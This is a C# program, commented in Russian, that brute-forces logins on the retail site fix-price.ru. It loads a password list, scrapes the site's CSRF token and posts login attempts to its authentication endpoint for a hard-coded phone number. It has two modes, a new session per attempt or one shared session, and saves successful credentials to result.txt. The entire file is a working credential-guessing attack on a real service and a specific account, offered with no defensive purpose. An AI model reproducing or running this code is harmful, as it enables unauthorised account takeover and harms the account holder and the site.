using AngleSharp;
using AngleSharp.Dom;
using AngleSharp.Io;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;


namespace FixPriceBruteForce
{
    /// <summary>
    /// Перебор паролей сайта fix-price.ru
    /// </summary>
    class FixPriceBF
    {
        #region privateFields
        private List<string> passwords;
        private int founded = 0;
        #endregion
        
        
        /// <summary>
        /// Загрузка паролей из файла в массив <see cref="Passwords"/>
        /// </summary>
        /// <param name="path">Путь к файлу с базой паролей</param>
        private void loadPasswords(string path)
        {
            Passwords = new List<string>();//Инициализация списка паролей
            StreamReader sr = new StreamReader(path);//Считыватель потока
            string line;//Одна строка из файла
            while (!sr.EndOfStream)//Пока не конец файла
            {
                line = sr.ReadLine();//Считать строку
                Passwords.Add(line);//Добавить это строку в список паролей
            }
            sr.Close();//Закрыть поток
            Console.WriteLine($"Загружено {Passwords.Count} паролей");//Вывести кол-во считанных паролей
        }


        /// <summary>
        /// Список паролей. Вероятно, неразумно подругружать в память 24к+ строк(в будущем может быть больше). 
        /// Возможно будет необходимо переделать под чтение сразу из потока
        /// </summary>
        public List<string> Passwords { get => passwords; private set => passwords = value; }
        
        
        /// <summary>
        /// Количество валидных паролей в базе(должно быть 1 или 0, т.к. в базе пароли без повторений,
        /// но для отладки можно добавить в разные места ещё валидные пароли)
        /// </summary>
        public int Founded { get => founded; private set => founded = value; }


        /// <summary>
        /// Класс брутфорсера FixPrice
        /// </summary>
        /// <param name="passwordDataPath">Путь к файлу с паролями для перебора</param>
        public FixPriceBF(string passwordDataPath)
        {
            loadPasswords(passwordDataPath);

            //инциализация для второго способа
            //типо заготовка данных пост запроса, там уже будет лежать токен(то есть N попыток коннекта будут в одной ссессии)
            var config = Configuration.Default//Конфиг для контекста "браузера"
.WithDefaultCookies()//Использовать куки
.WithDefaultLoader();//Использовать загрузчик
            context1 = BrowsingContext.New(config);//Ициализация "браузера" конфигом
            var document = context1.OpenAsync("https://fix-price.ru/personal/").Result;//Асинронно получаем основную страницу сайта фикспрайса и ждём результат
            var sessionCsrf = document.QuerySelector("input[name=CSRF]").GetAttribute("value");//Находим CSRF токен
            //Формируем шаблон данных, которые нужно будет отправить POST-запросом скрипту https://fix-price.ru/ajax/auth_user.php
            dictonary1.Add(@"AUTH_FORM", "Y");
            dictonary1.Add(@"TYPE", "AUTH");
            dictonary1.Add(@"CSRF", sessionCsrf);
            dictonary1.Add(@"backurl", @"/personal/");
            dictonary1.Add(@"auth_method", "phone");
        }


        #region FirstWay
        /// <summary>
        /// Второй способ перебора(долгий), каждый раз новая сессия
        /// </summary>
        /// <returns></returns>
        public async Task BruteFirst()
        {
            List<Task<IDocument>> documents = new List<Task<IDocument>>();//Задачи на загрузку результата попытки коннекта
            foreach (var password in Passwords)
            {
                documents.Add(ConnectFirst("+7 (999) 539-67-65", password));//Первый способ(каждый раз новая сессия)
            }
            Task.WaitAll(documents.ToArray());//Ждём пока все задачи(попытки войти) выполнятся
        }

        /// <summary>
        /// Первый способ
        /// Каждая попытка коннекта в новой сессии - грузим новые куки и токен
        /// </summary>
        /// <param name="login">Логин</param>
        /// <param name="password">Пароль</param>
        /// <returns></returns>
        public async Task<IDocument> ConnectFirst(string login, string password)
        {
            var config = Configuration.Default
.WithDefaultCookies()
.WithDefaultLoader();
            var context = BrowsingContext.New(config);
            var document = await context.OpenAsync("https://fix-price.ru/personal/");
            var sessionCsrf = document.QuerySelector("input[name=CSRF]").GetAttribute("value");
            var dictonary = new Dictionary<string, string>();
            dictonary.Add(@"AUTH_FORM", "Y");
            dictonary.Add(@"TYPE", "AUTH");
            dictonary.Add(@"CSRF", sessionCsrf);
            dictonary.Add(@"backurl", @"/personal/");
            dictonary.Add(@"auth_method", "phone");
            dictonary.Add(@"login", login);
            dictonary.Add(@"password", password);
            var documentRequest = DocumentRequest.PostAsUrlencoded(new Url("https://fix-price.ru/ajax/auth_user.php"),
                dictonary);
            var result = await context.OpenAsync(documentRequest);
            if (unicodeEncode(result.Source.Text) == "{\"res\":1}")
            {
                Console.WriteLine($"Успешный вход {login} {password}");
                File.WriteAllText("result.txt", $"{login} {password}");
                Founded++;
            }
            else
            {
                Console.WriteLine($"Неправильный пароль {login} {password}");
            }
            return result;
        }
        #endregion


        #region SecondWay
        /// <summary>
        /// Второй способ - все попытки коннекта в одной сессии (с одними и теме же куками и токеном)
        /// </summary>
        /// <param name="login">Логин</param>
        /// <param name="password">Пароль</param>
        /// <returns>Документ</returns>
        public async Task<IDocument> ConnectSecond(string login, string password)
        {
            var dictonary2 = dictonary1.ToDictionary(entry => entry.Key,
                                               entry => entry.Value);//Делаем копию шаблона коллекции данных(ака данные формы)
            //И добавляем в неё поля с логином и паролем
            dictonary2.Add(@"login", login);
            dictonary2.Add(@"password", password);
            //Формируем POST запрос к скрипту авторизации, инциализируя его данными(логин, пароль, токен и т.д.) из dictonary2 POST запросом
            var documentRequest = DocumentRequest.PostAsUrlencoded(new Url("https://fix-price.ru/ajax/auth_user.php"),
                dictonary2);
            //Выполняем открытие результата запроса
            var result = await context1.OpenAsync(documentRequest);
            if (unicodeEncode(result.Source.Text) == "{\"res\":1}")//Если результат вернул {"res":1} значит авторизация успешная
            {
                Console.WriteLine($"Успешный вход {login} {password}");
                File.AppendAllText("result.txt", $"{login} {password}\n");//Добавляем найденное совпадение в файл result.txt
                Founded++;//Инкриментируем счётчик найденых валидных паролей
            }
            //TODO Добавить вывод сообщения о результате запроса и обработать его соотвествуеющим образом
            else
            {
                Console.WriteLine($"Неправильный пароль {login} {password}");
            }
            return result;
        }
        /// <summary>
        /// Второй способ перебора - все запросы в одной сессии
        /// </summary>
        /// <returns></returns>
        public async Task BruteSecond()
        {
            List<Task<IDocument>> documents = new List<Task<IDocument>>();//Список задач на получение результата попытки авторизации
            foreach (var password in Passwords)
            {
                documents.Add(ConnectSecond("+7 (999) 539-67-65", password));//Из под одной сессии
            }
            Task.WaitAll(documents.ToArray());//Ждём пока все задачи(попытки войти) выполняцца
        }
        /// <summary>
        /// <list type="bullet">
        /// <item>
        /// Контекст HTTP запроса инициализируется с помощью конфига <see cref="IConfiguration"/>
        /// в котором задаётся использовать ли куки и как загружать страницу
        /// </item>
        /// <item>
        /// Контекст HTTP запроса для второго способа авторизации, при котором один контекст подключения
        /// существует всё время перебора паролей(то есть в одной сессии)
        /// </item>
        /// </list>
        /// </summary>
        IBrowsingContext context1;
        /// <summary>
        /// Тело пост запроса для второго способа авторизации, который эмулирует отправку формы, в виде коллекции.
        /// </summary>
        readonly Dictionary<string, string> dictonary1 = new Dictionary<string, string>();
        #endregion



        /// <summary>
        /// Декодирует юникод
        /// </summary>
        /// <param name="text"></param>
        /// <returns></returns>
        private static string unicodeEncode(string text)
        {
            var rx = new Regex(@"\\u([0-9A-Z]{4})", RegexOptions.Compiled | RegexOptions.IgnoreCase);
            return rx.Replace(text, p => new string((char)int.Parse(p.Groups[1].Value, NumberStyles.HexNumber), 1));
        }
    }
}
